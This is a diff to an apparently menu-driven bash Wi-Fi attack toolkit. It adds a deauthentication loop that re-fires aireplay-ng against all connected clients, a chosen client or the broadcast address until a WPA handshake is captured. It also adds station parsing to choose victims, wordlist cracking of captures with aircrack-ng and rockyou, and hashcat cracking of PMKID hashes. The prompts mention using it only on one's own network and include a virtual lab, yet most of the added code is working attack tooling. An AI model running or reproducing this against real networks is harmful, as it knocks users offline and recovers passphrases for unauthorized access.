@@ -28,10 +28,11 @@ MON_RX_DATA=-1 # -1 untested, 0 broken (no data frames), 1 working
 BUSY_CH=""   # busiest neighbor channel, set by scan_busiest_ch
 CAP_PCAP=""  # pcap produced by capture_airodump_pcap
 
-declare -a AP_BSSID=() AP_CH=() AP_ESSID=()
+declare -a AP_BSSID=() AP_CH=() AP_ESSID=() ST_MAC=() ST_PWR=() ST_PROBE=()
 TARGET_BSSID=""
 TARGET_CH=""
 TARGET_ESSID=""
+PICKED_CLIENT=""
 
 red()    { printf "\033[1;31m%s\033[0m\n" "$*"; }
 green()  { printf "\033[1;32m%s\033[0m\n" "$*"; }
@@ -383,26 +384,158 @@ ensure_target() {
     [[ -n "$TARGET_BSSID" ]] || select_target || die "Choose a network first (option 1)."
 }
 
+# ---- targeted deauth helpers -------------------------------------------------
+# airodump-ng -w <base> writes <base>-01.csv with two blocks: the AP list, then
+# (after the "Station MAC" header line) the associated clients.
+parse_stations() {
+    ST_MAC=(); ST_PWR=(); ST_PROBE=()
+    local line ins=0
+    while IFS= read -r line; do
+        [[ "$line" == *"Station MAC"* ]] && { ins=1; continue; }
+        [[ $ins -eq 1 ]] || continue
+        [[ "$line" =~ ^[0-9A-Fa-f:]{17} ]] || continue
+        ST_MAC+=("$(cut -d, -f1 <<<"$line" | tr -d ' ')")
+        ST_PWR+=("$(cut -d, -f4 <<<"$line" | tr -d ' ')")
+        ST_PROBE+=("$(cut -d, -f7 <<<"$line" | tr -d ' ')")
+    done < "$1"
+}
+
+# Let the user pick a connected client and deauth ONLY that client. A targeted
+# deauth (-c CLIENTMAC) is far more likely to work than broadcast: broadcasts are
+# widely ignored and can never touch a client that lives on another radio/channel.
+# returns: 0 = picked ($PICKED_CLIENT set), 2 = broadcast deauth chosen, 1 = skip.
+deauth_client_menu() {
+    local csv="${1}" i pick
+    PICKED_CLIENT=""
+    parse_stations "$csv"
+    if [[ ${#ST_MAC[@]} -eq 0 ]]; then
+        yellow "[-] No clients seen on THIS radio (ch $TARGET_CH, $TARGET_BSSID)."
+        yellow "    Your phone may be on the OTHER radio (e.g. 5GHz vs 2.4GHz)."
+        yellow "    Re-scan and pick that BSSID, or move the phone to 2.4GHz Wi-Fi."
+        read -r -p "[>] Broadcast deauth anyway? (y/N): " bc
+        [[ "${bc,,}" == "y" ]] && return 2
+        return 1
+    fi
+    echo
+    cyan "[*] Connected clients (ch $TARGET_CH) - columns: MAC, power, probed SSIDs:"
+    for i in "${!ST_MAC[@]}"; do
+        printf "  %2d) %-18s  %3s dBm   %s\n" "$((i+1))" "${ST_MAC[$i]}" "${ST_PWR[$i]}" "${ST_PROBE[$i]}"
+    done
+    while true; do
+        read -r -p "[>] Pick a client to deauth (0 = broadcast instead): " pick
+        [[ "$pick" == "0" ]] && return 2
+        [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#ST_MAC[@]} ]] && break
+    done
+    PICKED_CLIENT="${ST_MAC[$((pick-1))]}"
+    return 0
+}
+
+is_hs() { aircrack-ng "$1" 2>/dev/null | grep -qE 'WPA \([1-9][0-9]* handshake'; }
+
+# Turn a "no handshake" into a diagnosis: did EAPOL show up, did the deauth'd
+# client ever transmit on this channel, did any deauth land? tshark-only.
+hs_postmortem() {
+    local pcap="$1" eapol tx rx
+    command -v tshark >/dev/null 2>&1 || { yellow "   (install tshark for a frame-level diagnosis)"; return 0; }
+    eapol="$(tshark -r "$pcap" -Y eapol 2>/dev/null | wc -l)"
+    rx="$(tshark -r "$pcap" -Y 'wlan.fc.type_subtype == 0x0a || wlan.fc.type_subtype == 0x0c' 2>/dev/null | wc -l)"
+    echo "   EAPOL frames in capture  : $eapol"
+    echo "   deauth/disassoc seen     : $rx"
+    if [[ -n "$PICKED_CLIENT" ]]; then
+        tx="$(tshark -r "$pcap" -Y "wlan.sa == ${PICKED_CLIENT,,}" 2>/dev/null | wc -l)"
+        echo "   frames SENT by $PICKED_CLIENT: $tx"
+        [[ "$tx" -eq 0 ]] && yellow "      -> it never transmitted on ch$TARGET_CH: other radio, not associated, or PMF-blocked."
+    fi
+    if [[ "$eapol" -eq 0 ]]; then
+        yellow "   -> no fresh association happened here. Deauth ignored (802.11w/PMF)"
+        yellow "      or the client rejoined the OTHER radio (5GHz?). In the scan,"
+        yellow "      pick that BSSID instead."
+    fi
+}
+
 capture_wpa2() {
     gate_data_rx "handshake capture" || { read -r -p "[>] Enter to return to menu"; return; }
     ensure_target
-    local ts cap apid
+    local ts cap apid dplan="" rc i n rounds=0 cont="" got=0
     ts="$(date +%H%M%S)"; cap="${BASE}-${ts}"
     cyan "[*] Capturing handshake on $TARGET_BSSID (ch $TARGET_CH) -> ${OUT_DIR}/${cap}-01.cap"
     echo "[*] Watch for:  WPA handshake: $TARGET_BSSID"
     echo "[*] If none, toggle a client's WiFi (your phone)."
-    # Run quietly: airodump's full-screen UI would hide our prompts below.
-    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "${OUT_DIR}/${cap}" "$MON_IF" >/dev/null 2>&1 &
+    # Run quietly AND with stdin from /dev/null: airodump's curses UI would
+    # otherwise grab the terminal and swallow the keys you type at the prompt
+    # below, and its full-screen UI would hide our prompts.
+    airodump-ng -c "$TARGET_CH" --bssid "$TARGET_BSSID" -w "${OUT_DIR}/${cap}" "$MON_IF" </dev/null >/dev/null 2>&1 &
     apid=$!
 
-    sleep 15
+    # give airodump a moment to build the station table before deauthing
+    sleep 8
     echo
-    read -r -p "[>] Deauth a client? enter client MAC, or ENTER to skip: " client
-    if [[ -n "$client" ]]; then
-        aireplay-ng -0 3 -a "$TARGET_BSSID" -c "$client" "$MON_IF"
+    echo "[*] Deauth plan (only on YOUR network), re-fired every 5s until a handshake shows:"
+    read -r -p "[>]  [a]ll clients  [c]hoose one client  [b]roadcast  [m]anual MAC  / ENTER skip: " dm
+    case "${dm,,}" in
+        a)
+            dplan="all"
+            ;;
+        c)
+            deauth_client_menu "${cap}-01.csv"
+            case $? in
+                0) dplan="mac:$PICKED_CLIENT" ;;
+                2) dplan="bcast" ;;
+            esac
+            ;;
+        b) dplan="bcast" ;;
+        m)
+            read -r -p "[>] Client MAC: " client
+            [[ "$client" =~ ^[0-9A-Fa-f:]{17}$ ]] && dplan="mac:$client" || yellow "[-] Bad MAC; no deauth."
+            ;;
+        *) yellow "    (${dm:-unknown} - skipping deauth)" ;;
+    esac
+
+    if [[ -n "$dplan" ]]; then
+        while [[ $got -eq 0 ]]; do
+            for i in $(seq 1 12); do  # 60s of 5s deauth rounds
+                is_hs "${OUT_DIR}/${cap}-01.cap" && { got=1; break; }
+                case "$dplan" in
+                    all)
+                        PICKED_CLIENT=""
+                        parse_stations "${cap}-01.csv"
+                        if [[ ${#ST_MAC[@]} -gt 0 ]]; then
+                            PICKED_CLIENT="${ST_MAC[0]}"
+                            for n in "${!ST_MAC[@]}"; do
+                                aireplay-ng -0 2 -a "$TARGET_BSSID" -c "${ST_MAC[$n]}" "$MON_IF" >/dev/null 2>&1 || true
+                            done
+                            yellow "   [${i}x5s] targeted deauth of ${#ST_MAC[@]} client(s)"
+                        else
+                            aireplay-ng -0 2 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1 || true
+                            yellow "   [${i}x5s] no clients listed - broadcasting instead"
+                        fi
+                        ;;
+                    bcast)
+                        aireplay-ng -0 2 -a "$TARGET_BSSID" "$MON_IF" >/dev/null 2>&1 || true
+                        yellow "   [${i}x5s] broadcast deauth"
+                        ;;
+                    mac:*)
+                        rc="${dplan#mac:}"
+                        aireplay-ng -0 2 -a "$TARGET_BSSID" -c "$rc" "$MON_IF" >/dev/null 2>&1 || true
+                        yellow "   [${i}x5s] targeted deauth $rc"
+                        ;;
+                esac
+                sleep 5
+                is_hs "${OUT_DIR}/${cap}-01.cap" && { got=1; break; }
+            done
+            [[ $got -eq 1 ]] && break
+            rounds=$((rounds+1))
+            read -r -p "[>] No handshake yet ($((rounds*60))s so far). Keep deauthing? (y/N): " cont
+            [[ "${cont,,}" == "y" ]] || break
+        done
+        if [[ $got -eq 1 ]]; then
+            green "[+] Handshake captured during the deauth loop!"
+        else
+            yellow "[-] Stopped after $((rounds*60))s of deauth rounds."
+        fi
+        echo
     else
-        read -r -p "[>] Broadcast deauth (only on YOUR network)? (y/N): " bc
-        [[ "${bc,,}" == "y" ]] && aireplay-ng -0 3 -a "$TARGET_BSSID" "$MON_IF"
+        echo "[*] No deauth - waiting for a client to connect/reconnect on its own..."
     fi
 
     read -r -p "    ...press ENTER to stop capturing"
@@ -410,11 +543,13 @@ capture_wpa2() {
     pkill -f "airodump-ng -c $TARGET_CH" >/dev/null 2>&1 || true
     sleep 2
 
-    if aircrack-ng "${OUT_DIR}/${cap}-01.cap" 2>/dev/null | grep -qE 'WPA \([1-9][0-9]* handshake'; then
+    if is_hs "${OUT_DIR}/${cap}-01.cap"; then
         green "[+] Handshake captured: ${OUT_DIR}/${cap}-01.cap"
         aircrack-ng "${OUT_DIR}/${cap}-01.cap" | grep -E 'WPA \([1-9][0-9]* handshake' || true
     else
-        red "[-] No handshake yet. Retry and reconnect a client during the run."
+        red "[-] No handshake yet."
+        hs_postmortem "${OUT_DIR}/${cap}-01.cap"
+        yellow "    Retry and reconnect a client during the run."
     fi
 }
 
@@ -625,6 +760,8 @@ EOF
     HOSTAPD_PID=""; TCPDUMP_PID=""
 
     green "[+] Capture saved: $pcap"
+    printf '%s\n' "$pass" football ok123456 password 12345678 admin letmein \
+        > "$OUT_DIR/demo-wordlist.txt"
     [[ $ok -eq 1 ]] || yellow "    (client didn't associate - check /tmp/wg-hwsim-hostapd.log)"
     yellow "[*] EAPOL frames captured:"
     if command -v tshark >/dev/null; then tshark -r "$pcap" 2>/dev/null | head -12;
@@ -651,15 +788,107 @@ EOF
     else
         yellow "[-] hcxtools not installed -> sudo apt install hcxtools"
     fi
+    yellow "[*] Aircrack demo on $pcap (auto - same as option 7 [c]rack):"
+    crack_capture "$pcap" "$OUT_DIR/demo-wordlist.txt"
     modprobe -r mac80211_hwsim >/dev/null 2>&1
 }
 
 # ---------------------------------------------------------------- misc
+# locate a wordlist under common paths (rockyou.txt)
+resolve_wordlist() {
+    local w
+    for w in "$HOME/rockyou.txt" "$HOME/seclists/rockyou.txt" \
+             /usr/share/wordlists/rockyou-75.txt /usr/share/wordlists/rockyou.txt \
+             /usr/share/seclists/Passwords/rockyou.txt; do
+        [[ -f "$w" ]] && { echo "$w"; return; }
+    done
+}
+
+# crack one WPA .cap with aircrack-ng and print the KEY if found
+crack_capture() {
+    local f="$1" wl="${2:-}" res key
+    [[ -n "$wl" && -f "$wl" ]] || wl="$(resolve_wordlist)"
+    if [[ -z "$wl" ]]; then
+        read -r -p "[>] Wordlist path (e.g. /usr/share/wordlists/rockyou.txt): " wl
+    fi
+    [[ -f "$wl" ]] || { yellow "    wordlist not found: $wl"; return 1; }
+    cyan "[*] Cracking $f with $(basename "$wl") - big lists take minutes..."
+    res="$(aircrack-ng -w "$wl" "$f" 2>/dev/null)"
+    if grep -q 'KEY FOUND' <<<"$res"; then
+        key="$(grep -oE 'KEY FOUND! \[ [^]]+ \]' <<<"$res" | head -1)"
+        green "[+] $key"
+        grep -E '^Network Name:|^         BSSID|^              ' <<<"$res" | head -2
+        green "[+] Passphrase was in the wordlist - that's why quickly crackable."
+    else
+        yellow "[-] Passphrase not in $wl. Short/weak passwords only - random ones won't crack."
+    fi
+}
+
+# crack any hashcat 22000 hashes present (PMKID / AP-lab / virtual-lab output)
+crack_hashes() {
+    local wl h
+    command -v hashcat >/dev/null 2>&1 || { yellow "    hashcat not installed (sudo apt install hashcat)"; return; }
+    local -a hs=()
+    for h in *.22000; do [[ -f "$h" ]] && hs+=("$h"); done
+    [[ ${#hs[@]} -eq 0 ]] && { yellow "    (no .22000 hashes here)"; return; }
+    wl="$(resolve_wordlist)"
+    [[ -z "$wl" ]] && read -r -p "[>] Wordlist path: " wl
+    [[ -f "$wl" ]] || { yellow "    wordlist not found: $wl"; return; }
+    for h in "${hs[@]}"; do yellow "[*] hashcat -m 22000 $h"; hashcat -m 22000 "$h" "$wl" >/dev/null 2>&1 || true; done
+    echo
+    hashcat -m 22000 --show "${hs[@]}" 2>/dev/null || true
+    echo
+}
+
 show_captures() {
     echo
-    cyan "[*] Capture files in $OUT_DIR:"
-    ls -lh "$OUT_DIR" 2>/dev/null | grep -iE "cap|pcap|22000|hcxdump" \
-        || yellow "    (none yet)"
+    cyan "[*] Captures in $OUT_DIR:"
+    cd "$OUT_DIR" 2>/dev/null || { yellow "    (cannot cd $OUT_DIR)"; read -r -p "[-] Press ENTER to continue..."; return; }
+    local -a caps=()
+    local f sz tm hs i y pick
+    for f in cap-*.cap ap-hs-*.pcap; do [[ -f "$f" ]] && caps+=("$f"); done
+    if [[ ${#caps[@]} -eq 0 ]]; then
+        yellow "    (none yet)"
+        read -r -p "[-] Press ENTER to continue..."
+        return
+    fi
+    echo "     #   size      last modified         file                       result"
+    for i in "${!caps[@]}"; do
+        f="${caps[$i]}"
+        sz="$(numfmt --to=iec-i --suffix=B "$(stat -c %s "$f")" 2>/dev/null || stat -c %s "$f")"
+        tm="$(stat -c %y "$f" 2>/dev/null | cut -d. -f1)"
+        hs=""
+        [[ "$f" == *.cap ]] && hs="$(aircrack-ng "$f" 2>/dev/null | grep -oE 'WPA \([1-9][0-9]* handshake\)' | head -1 | tr -d '\r')"
+        printf "   %3d) %7s  %s  %-26s %s\n" "$((i+1))" "$sz" "$tm" "$f" "${hs:-no handshake}"
+    done
+    echo
+    echo "    [n]umber = delete that capture   [a]ll = delete everything"
+    echo "    [c]rack a capture (find the password)    [h]ash = crack .22000   0 = back"
+    read -r -p "[>] Your choice: " pick
+    case "$pick" in
+        c|C)
+            read -r -p "[>] Number of capture to crack: " cn
+            if [[ "$cn" =~ ^[0-9]+$ ]] && [[ "$cn" -ge 1 ]] && [[ "$cn" -le ${#caps[@]} ]]; then
+                crack_capture "${caps[$((cn-1))]}"
+            else
+                yellow "    bad number"
+            fi
+            ;;
+        h|H)
+            crack_hashes
+            ;;
+        a|A)
+            read -r -p "[>] Delete ALL capture files? (y/N): " y
+            [[ "${y,,}" == "y" ]] && { rm -f cap-*.* ap-hs-*.pcap *.22000 hcxdump; green "    deleted."; }
+            ;;
+        [0-9]*)
+            if [[ "$pick" =~ ^[0-9]+$ ]] && [[ "$pick" -ge 1 ]] && [[ "$pick" -le ${#caps[@]} ]]; then
+                f="${caps[$((pick-1))]}"
+                rm -f "${f%.cap}"* "$f" 2>/dev/null
+                green "    deleted $f + sidecar files"
+            fi
+            ;;
+    esac
     read -r -p "[-] Press ENTER to continue..."
 }
 
@@ -696,13 +925,18 @@ save_conf() {
 }
 
 install_deps() {
-    local pkgs=(aircrack-ng hcxtools hostapd dnsmasq tcpdump tshark hashcat)
-    local miss=() t pm
-    for t in "${pkgs[@]}"; do
-        command -v "$t" >/dev/null 2>&1 || miss+=("$t")
+    local pkgs=(aircrack-ng iw hostapd dnsmasq tcpdump hcxtools hcxdumptool tshark hashcat)
+    local bins=(aircrack-ng iw hostapd dnsmasq tcpdump hcxpcapngtool hcxdumptool tshark hashcat)
+    local miss=() t pm still=() i
+    for i in "${!pkgs[@]}"; do
+        if ! command -v "${bins[$i]}" >/dev/null 2>&1; then
+            miss+=("${pkgs[$i]}")
+            [[ $i -ge 5 ]] &&
+                yellow "    note: ${pkgs[$i]} (${bins[$i]}) not installed - option 3/4/8 features degrade"
+        fi
     done
     if [[ ${#miss[@]} -eq 0 ]]; then
-        green "    all tools present"
+        green "    all required tools present"
         return
     fi
     if command -v apt-get >/dev/null; then pm=apt
@@ -713,13 +947,33 @@ install_deps() {
         red "[-] Missing tools: ${miss[*]} - install them for your distro."
         return
     fi
-    yellow "[*] Installing missing tools: ${miss[*]}"
+    yellow "[*] Installing missing tools: ${miss[*]} (may need network, ~60s max)"
+    if [[ "$pm" == apt ]]; then
+        local uri host
+        uri="$(grep -rhoE 'https?://[^ /]+' /etc/apt/sources.list /etc/apt/sources.list.d/*.sources /etc/apt/sources.list.d/*.list 2>/dev/null | grep -v 'security' | head -1)"
+        host="${uri#*://}"; host="${host%%/*}"
+        if [[ -n "$host" ]] && ! timeout 5 bash -c "</dev/tcp/${host}/80" >/dev/null 2>&1 \
+                                 && ! timeout 5 bash -c "</dev/tcp/${host}/443" >/dev/null 2>&1; then
+            yellow "    apt mirror $host unreachable - skipping install (flows that miss tools degrade, rest work)"
+            return
+        fi
+    fi
     case "$pm" in
-        apt)   DEBIAN_FRONTEND=noninteractive apt-get update >/dev/null 2>&1
-               DEBIAN_FRONTEND=noninteractive apt-get install -y "${miss[@]}" || true ;;
-        dnf)   dnf install -y "${miss[@]}" || true ;;
-        pacman) pacman -Sy --noconfirm "${miss[@]}" || true ;;
+        apt)
+            timeout 45 sh -c 'DEBIAN_FRONTEND=noninteractive apt-get update' >/dev/null 2>&1 \
+                || yellow "    apt update failed (offline?) - trying install anyway"
+            timeout 120 env DEBIAN_FRONTEND=noninteractive apt-get install -y "${miss[@]}" >/dev/null 2>&1 || true ;;
+        dnf)   timeout 120 dnf install -y "${miss[@]}" >/dev/null 2>&1 || true ;;
+        pacman) timeout 120 pacman -Sy --noconfirm "${miss[@]}" >/dev/null 2>&1 || true ;;
     esac
+    for i in "${!pkgs[@]}"; do
+        [[ $i -ge 5 ]] && continue
+        command -v "${bins[$i]}" >/dev/null 2>&1 || still+=("${pkgs[$i]}")
+    done
+    if [[ ${#still[@]} -gt 0 ]]; then
+        red "[-] Still missing (required): ${still[*]}"
+        yellow "    Capture/AP flows need these. Fix apt first (see README) then rerun."
+    fi
 }
 
 pick_interface() {
@@ -796,7 +1050,7 @@ main_menu() {
         echo " 4) Capture WPA3/SAE                    (monitor)"
         echo " 5) WPA2 lab AP (hostapd) - NO monitor  (works on this card)"
         echo " 6) Diagnose capabilities/monitor RX"
-        echo " 7) Show captured files"
+        echo " 7) View / delete captured files"
         echo " 8) Virtual WiFi lab (software, mac80211_hwsim)"
         echo " 9) Exit"
         read -r -p $'\n[>] Select (1-9): ' choice
